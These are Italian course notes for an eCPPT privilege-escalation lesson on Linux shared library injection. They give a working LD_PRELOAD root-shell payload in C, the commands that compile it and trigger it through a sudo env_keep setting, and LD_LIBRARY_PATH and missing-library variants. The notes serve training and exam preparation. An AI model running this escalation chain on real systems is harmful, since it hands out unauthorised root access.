# 018 — Shared Library Injection (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 18/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [018_ Shared Library Injection.txt](018_ Shared Library Injection.txt) · [018_ Shared Library Injection.srt](018_ Shared Library Injection.srt)

## Concetti chiave

- **Shared library** in Linux = file `.so` (shared object), equivalente delle DLL Windows: contiene codice riutilizzabile caricato a runtime da più processi.
- **Shared Library Injection** = caricare una `.so` malevola dentro un processo privilegiato per eseguire codice arbitrario coi suoi privilegi. È l'analogo Linux del **DLL Hijacking** (video 013).
- Tecniche di injection: **`LD_PRELOAD`** (la più comune e oggetto del lab), **`LD_LIBRARY_PATH`**, **`RPATH`/`RUNPATH`** hijacking, **`ptrace()`** injection.
- Prerequisito del lab: in `sudo -l` compare `env_keep+=LD_PRELOAD` **e** un binario lanciabile via sudo (es. `apache2`). Combinando i due, `LD_PRELOAD` sopravvive a `sudo` → la `.so` malevola si carica nel processo apache2 lanciato come root.
- Risultato lab: `sudo LD_PRELOAD=/home/student/shell.so apache2` → root shell.

## Spiegazione approfondita

### Cos'è una shared library (.so)

- File contenente codice/dati linkati dinamicamente in più processi.
- Caricamento gestito dal **dynamic linker** (`ld-linux.so` / `ld.so`).
- Lookup di una libreria in ordine:
  1. `DT_RPATH` (deprecato) nel binario.
  2. **`LD_LIBRARY_PATH`** (env var).
  3. `DT_RUNPATH` nel binario.
  4. `/etc/ld.so.cache` (gestito da `ldconfig`).
  5. Default: `/lib`, `/usr/lib` (e arch variants).
- **`LD_PRELOAD`** è speciale: forza il caricamento di una `.so` **prima** di qualsiasi altra → simboli definiti nella preloaded library hanno precedenza (utile per hooking/monitoring legittimo... e per privesc).

### Sicurezza di `LD_PRELOAD`

Per impedire abuso, **il dynamic linker ignora `LD_PRELOAD`** se il binario è SUID/SGID (a meno che la `.so` non sia anch'essa SUID in una system dir). Quindi `LD_PRELOAD` da solo NON basta su un SUID binary.

**Eccezione**: `sudoers` con `Defaults env_keep += "LD_PRELOAD"` → sudo **propaga** la variabile al binario lanciato come root → l'attacco funziona.

### Lab — `LD_PRELOAD` + sudo

#### Step 1 — Enumerate sudo privileges
```bash
sudo -l
# Defaults env_keep += "LD_PRELOAD"
# User student may run the following commands:
#     (root) NOPASSWD: /usr/sbin/apache2
```
Combinazione chiave: **env_keep+=LD_PRELOAD** + binario eseguibile come root.

#### Step 2 — Scrivere la shared library malevola in C

`shell.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");   // evita ricorsione infinita
    setgid(0);                // GID root
    setuid(0);                // UID root
    system("/bin/sh");        // spawn shell
}
```

Note:
- La funzione si chiama **`_init()`** (constructor del loader): viene eseguita automaticamente al `dlopen`/load della libreria.
- `unsetenv("LD_PRELOAD")` evita che la shell figlia ri-carichi la stessa lib in loop.
- `setuid(0)/setgid(0)` portano UID/GID effettivi a root (il processo apache2 è root → setuid riesce).
- `system("/bin/sh")` lancia la shell.

#### Step 3 — Compilare come shared object
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Flag:
- **`-fPIC`** (*Position Independent Code*) — obbligatorio per `.so`.
- **`-shared`** — produce shared object invece di eseguibile.
- **`-nostartfiles`** — niente `crt0`, così `_init()` è il punto di ingresso "puro".

#### Step 4 — Trigger via sudo
```bash
sudo LD_PRELOAD=/home/student/shell.so apache2
# # id
# uid=0(root) gid=0(root)
```
`sudo` mantiene `LD_PRELOAD` (per `env_keep`), invoca `apache2` come root, il dynamic linker carica `shell.so`, `_init()` esegue → root shell.

### Altre tecniche di shared library injection

| Tecnica | Descrizione | Prerequisito |
|---|---|---|
| **LD_PRELOAD** | Forza caricamento `.so` prima delle altre | `env_keep+=LD_PRELOAD` in sudoers (lab) |
| **LD_LIBRARY_PATH hijack** | Aggiunge una dir scrivibile alla search path | `env_keep+=LD_LIBRARY_PATH` + lib mancante o overridabile |
| **RPATH/RUNPATH hijack** | Il binario embedda un path scrivibile per le libs | Binario compilato con RPATH inseguro |
| **`/etc/ld.so.conf.d/` writable** | Aggiungi path con libreria malevola, `ldconfig` la carica | Write su quella dir + esecuzione di ldconfig |
| **`ptrace()` injection** | Attacker inietta `dlopen` in processo target a runtime | Capability `CAP_SYS_PTRACE` o `ptrace_scope=0` |
| **`.so` mancante in binario SUID** | `ldd binary` mostra "not found" → drop in cwd o LD_LIBRARY_PATH | SUID binary con dep mancante |

### Verifica delle dipendenze
```bash
ldd /usr/sbin/apache2
# elenco .so caricate, con path e indirizzi
# "not found" = candidate hijack
readelf -d /path/binary | grep -i rpath  # vede RPATH/RUNPATH
```

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `sudo -l` | Cerca `env_keep+=LD_PRELOAD` o `LD_LIBRARY_PATH` | Step 1 |
| `ldd <binary>` | Lista dipendenze dinamiche del binario | Trova .so mancanti / hijackabili |
| `readelf -d <binary>` | Vede RPATH/RUNPATH | Per hijack RPATH |
| `gcc -fPIC -shared -nostartfiles -o evil.so evil.c` | Compila `.so` malevola | Comando esatto del video |
| `sudo LD_PRELOAD=/path/evil.so /bin/<target>` | Trigger via sudo | Lab pattern |
| `LD_LIBRARY_PATH=/tmp ./vulnbin` | Variante LD_LIBRARY_PATH | Se env_keep lo permette |
| `unsetenv("LD_PRELOAD")` nel codice C | Evita loop ricorsivo | Best practice |
| `setuid(0); setgid(0); system("/bin/sh");` | Body classico della `_init` | |
| **LinPEAS** | Sezione "Sudo & PolicyKit" + "Library hijacking" | Auto-discovery |
| **GTFOBins** | Sezione *Sudo* + *LD_PRELOAD* | Riferimento |

## Esempi pratici

```bash
# 1. Discovery
sudo -l
# Defaults env_keep += "LD_PRELOAD"
# (root) NOPASSWD: /usr/sbin/apache2
```

```c
// 2. shell.c — payload
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```bash
# 3. Compile
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# 4. Trigger
sudo LD_PRELOAD=/home/student/shell.so apache2
# # whoami
# root
```

```bash
# Variante LD_LIBRARY_PATH (se env_keep lo include e binary cerca .so non absolute)
mkdir /tmp/evil
cp shell.so /tmp/evil/libcrypto.so.1.1     # nome di una dep nota
sudo LD_LIBRARY_PATH=/tmp/evil /usr/sbin/apache2
```

```bash
# Variante con dep mancante (no sudo richiesto se SUID binary)
ldd /usr/local/bin/vulnerable
#   libfoo.so => not found
# → crea libfoo.so nel cwd o LD_LIBRARY_PATH
```

## Punti d'attenzione per l'esame eCPPT

- **Trigger chiave**: vedere `env_keep+=LD_PRELOAD` in `sudo -l`. Da quel momento la catena è quasi automatica.
- **Memorizza il comando di compilazione**: `gcc -fPIC -shared -o evil.so evil.c -nostartfiles`. Spesso chiesto.
- **`_init()`** è la funzione che viene chiamata al load — non `main()`. Senza `-nostartfiles` puoi anche usare `__attribute__((constructor))`.
- **Tre chiamate canoniche** nel payload: `setuid(0)`, `setgid(0)`, `system("/bin/sh")`. Più `unsetenv("LD_PRELOAD")` per evitare loop.
- **Differenza vs SUID exploitation**: qui sfrutti **sudo + env_keep**, non il bit SUID. `LD_PRELOAD` su binari SUID viene **scartato** dal dynamic linker.
- **Equivalente Windows**: DLL Hijacking (video 013). Concettualmente identico: drop di una libreria malevola in un percorso letto da processo privilegiato.
- **`ldd <binary>`** = primo check di sicurezza per librerie dinamiche caricate.
- **`/etc/ld.so.conf.d/` writable** è un caso analogo: scrivi un file `.conf` che punta a una dir con la tua lib, esegui `ldconfig`, qualsiasi binario che cerca quella lib la carica.
- Pattern attacco esame: vedi `env_keep` strano → cerca cosa puoi lanciare in sudo → costruisci `.so` → trigger.

## Collegamenti con altri video

- Precedente: [[017_ Misconfigured SUDO Privileges]] — è la base (sudo -l ti dà il vettore).
- Prossimo: [[019_Course Conclusion]] — chiusura del modulo.
- Equivalente Windows: [[013_DLL Hijacking]] — stessa logica con `.dll` e search order.
- Concetto correlato: [[014_Locally Stored Credentials]] (Linux PrivEsc sezione).
- MITRE ATT&CK: T1574.006 (Dynamic Linker Hijacking), T1548.003 (Sudo Caching).
- Risorsa: GTFOBins, LinPEAS (sezione *Capabilities* + *Sudo*), [HackTricks — LD_PRELOAD privesc](https://book.hacktricks.xyz).
